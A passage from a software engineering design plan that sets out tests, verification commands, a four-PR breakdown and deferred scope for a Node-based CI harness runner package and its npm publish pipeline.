5. **Node-runtime gate.** Run the CLI under `node` (not `bun`) once to catch a Bun-ism (trap b).
6. **No-network assertion.** Assert the shipped entrypoints import no `http`/`https`/`net`/`fetch`.

**PR 2 — lint-meta engine:**
7. Clone `createFakeCtx` (`tools/lint-meta/tests/test-utils/createFakeCtx.ts`): a passing rule and a
   `ciCritical` violating rule run through the ported engine ⇒ exit 0 / exit 1; violation formatting
   matches `[ERROR] <rule> (<file>): <message>`; a rule that throws is itself a critical failure
   (`cli.ts:69-84`). Baseline/ratchet round-trips (`baseline.ts`). Node `IMetaCtx.glob` via
   `fs.globSync` returns the same set as the Bun ctx on a fixture tree.
8. **Bounded eval.** The subcommand imports only the enumerated registry, not arbitrary files (feed
   a dir with an extra stray `.js` and assert it is NOT imported/run).

**PR 3 — Rust export + web:**
9. `export.rs` unit tests (clone the `apply.rs`/`harness_manifest.rs` tempdir harness): the bundle
   lands under `.nightcore/export/portable-lock/`; `harness.json` is stamped `schemaVersion`; the
   workflow YAML is deterministic + pins `<PINNED>`; the writer stays contained (a symlinked
   `.nightcore` escaping root is rejected, mirroring `write_merge_manifest`'s test `apply.rs:863`);
   it **never writes under `.github/`**; re-export overwrites the staging dir idempotently.
10. `schemaVersion` additive round-trip (clone `harness_manifest.rs` unknown-key-survives tests).
11. Web: story/test for the export button + preview dialog (copy affordance, the manual-step
    instruction) — clone `ui/IssueMapExportButton` tests; `cargo test` regenerates the ts-rs type.

**PR 4 — publish:**
12. `npm pack --dry-run` (or `publint`) asserts the tarball ships `dist` + `bin` and nothing else
    (trap c); a workflow dry-run proves publish is tag-gated and provenance is on.

---

## 8. Verification gates (run per PR)

```
bun install --frozen-lockfile                 # fresh worktree bootstrap (trap a)
bun run lint                                  # eslint-plugin + eslint . + lint:meta (parity rules on the new package, trap e; export button folder, trap f)
bun run lint:meta                             # zero violations on a clean tree (package-shape / workspace-graph / test-enrollment)
bun run --filter @nightcore/harness build     # PR 1+: the runner's OWN tsup build ships a real dist (trap c)
node packages/harness/dist/cli.js --version   # PR 1+: runs under plain NODE, not bun (trap b)
bun run test:node                             # PR 1/2: runner + lint-meta fixtures (after enrolling packages/harness, trap e)
bun run --filter @nightcore/web typecheck     # PR 3: root tsc -b does NOT cover apps/web
bun run --filter @nightcore/web test          # PR 3: export button story/test
cargo fmt --all --check                       # PR 3: MUST run from apps/desktop/src-tauri (root no-ops)
cargo clippy --all-targets                    # PR 3: from apps/desktop/src-tauri
cargo test                                     # PR 3: export.rs + schemaVersion tests + ts-rs regen (commit generated + bindings, trap d)
npm pack --dry-run                            # PR 4: tarball ships dist + bin, nothing leaked (trap c)
bun run dogfood:engine                        # PR 3 manual: scan a scratch repo → arm a check → Export portable lock → inspect .nightcore/export
```
- **PR 3** is the only PR where `cargo test` performs a real ts-rs regen (`PortableLockExport`) —
  commit both `apps/web/src/lib/generated/*` and `bindings/*`; never hand-edit.
- **The runner must be exercised under plain `node`** before PR 1 is declared done (trap b only
  manifests off Bun).

---

## 9. PR slicing (four PRs; each independently green)

### PR 1 — `@nightcore/harness` runner package + the `check` core (the port of `gauntlet_project`)
- **Scope:** new `packages/harness/` workspace package (`@nightcore/harness`, `bin: harness`, own
  tsup build, zero runtime deps, Node ≥ 22); `src/{cli,manifest,run,index}.ts` + tests; enroll in
  `test:node`; satisfy the lint-meta parity rules.
- **Encodes:** the faithful port of `config.rs` (lenient load + plan) + `runner.rs` (sequential,
  stop-at-first, `fix_instruction`); the `schemaVersion` gate; `--json`; opt-in-by-presence
  (absent/empty ⇒ exit 0). Prints every command before running (§ 5 legibility).
- **Green because:** additive new package; behavior is a port of tested Rust; fully headless
  (fixture manifests + injected spawn fn, no network, no Nightcore). Web/Rust gates are no-ops.

### PR 2 — the portable `lint-meta` subcommand (bundled engine) + the `lint-meta` armable kind
- **Scope:** `src/lint-meta/` — the ported engine (Node `IMetaCtx`, run loop, baseline) + the
  published `IMetaRule`/`IMetaCtx`/`IViolation` contract in `src/index.ts`; add `lint-meta` to
  `HarnessCheckKind` (`config.rs`) + `ARMABLE_CHECK_KINDS` (`commands.rs`) in lockstep; a small
  synthesis-prompt tweak so generated `lint-meta-rule` artifacts import the contract from
  `@nightcore/harness`.
- **Encodes:** enforceable lint-meta rules in a target's CI without Bun; bounded eval (§ 5).
- **Green because:** additive CLI subcommand + additive Rust kind (both allowlists) + additive
  synthesis text; headless fixtures (fake ctx). **Deferrable** — PR 1/3/4 ship the ESLint portable
  lock without it.

### PR 3 — Rust `export_portable_lock` + manifest `schemaVersion` + CI-workflow scaffold + Enforce-stage UI
- **Scope:** new `sidecar/harness/export.rs` (Rust-templated staging writer, § 3.4 — NOT apply.rs);
  the `nightcore-lock.yml` template + README; `schemaVersion` additive stamp in
  `store/harness_manifest.rs`; `PortableLockExport` ts-rs type in `bindings/export.rs`;
  `export_portable_lock` command in `generate_handler!`; the Enforce-stage export button + preview
  dialog (`ui/`-style, beside `IssueMapExportButton` at `HarnessView/HarnessView.tsx:204`) + bridge
  wrapper.
- **Encodes:** decisions 2 + 4 (ready-to-commit workflow; reviewable staging, never a silent
  overwrite; workflow copied by the human, never auto-placed into the denied CI sink).
- **Green because:** additive command + additive manifest key + additive UI; `cargo test`
  regenerates/commits the ts-rs type; export writer is a new, self-contained, tempdir-tested module
  that never touches `apply.rs`.

### PR 4 — the npm publish pipeline (greenfield — the repo has never published to npm)
- **Scope:** un-`private` `@nightcore/harness` (`publishConfig: { access: public }`), real synced
  `version`, `repository`/`license`/`description`, `files: ["dist"]`, `prepublishOnly` build; new
  `.github/workflows/publish-harness.yml` on a `harness-v*` tag (SEPARATE from the app's `v*.*.*`
  namespace so it never collides with `release.yml`'s Tauri build): checkout → setup-node 22 →
  `bun install --frozen-lockfile` → build → `test:node` → `npm publish --provenance --access public`
  with `NPM_TOKEN` + `id-token: write`; pin `<PINNED>` in the PR 3 template to the published version.
- **Encodes:** decision 3's "publish pipeline prerequisite" (decision 5); the § 5 supply-chain
  posture (provenance, pinned exported version).
- **Green because:** the workflow is additive and tag-gated; a `npm pack --dry-run` / `publint` job
  proves the tarball without publishing. No other package's privacy changes.

---

## 10. Deferred / out of v1 (named so they are not silently in-scope)

- **`policy` CI enforcement** (FLAG D, § 3.6) — the agent-runtime tiers (deny/ask/allow, tool gates)
  are permanently CI-meaningless; the CI-checkable subset (`diffBudget`, `protected_paths` via a
  `policy --base <ref>` check) is deferred. v1 exports the policy block as data, enforces `checks[]`.
- **Heavier-toolchain checks in the exported workflow** (FLAG A) — ast-grep, api-extractor,
  mutation-score, secret-scan travel in `.nightcore/harness.json` (the runner runs any `command`),
  but v1's generated workflow assumes only the target's own ESLint (near-universal) + the bundled
  lint-meta engine. Arming a heavier check is opt-in (the user adds the tool to their CI). The issue
  called this "deferred until the runner can run them"; the accurate framing is "deferred until the
  target's CI has the tool," since the runner already runs any command.
- **Integrity attestation of the target's rules** (§ 2 / § 5) — permanently rejected: the artifacts
  are downstream-owned; the runner enforces what is present. No hash/signature check of the committed
  rules against Nightcore's output; PR review of the diff is the control.
- **Auto-writing `.github/workflows/nightcore-lock.yml`** — permanently rejected: the CI sink is
  human-committed (the `apply.rs` denylist invariant, § 3.4). The exporter stages it; the user copies.
- **Editor / Claude Code integration** (the "teammate's editor" half of opportunity 3) — v1 targets
  CI (decision 2). The committed ESLint plugin already works in any editor's ESLint; a dedicated
  Claude Code / editor packaging is a later slice.
- **A registry/marketplace of shareable locks** — out. The lock is per-repo, committed, downstream-owned.
- **Self-update / `@latest`** — out; the exported workflow pins the runner version (§ 5).
```
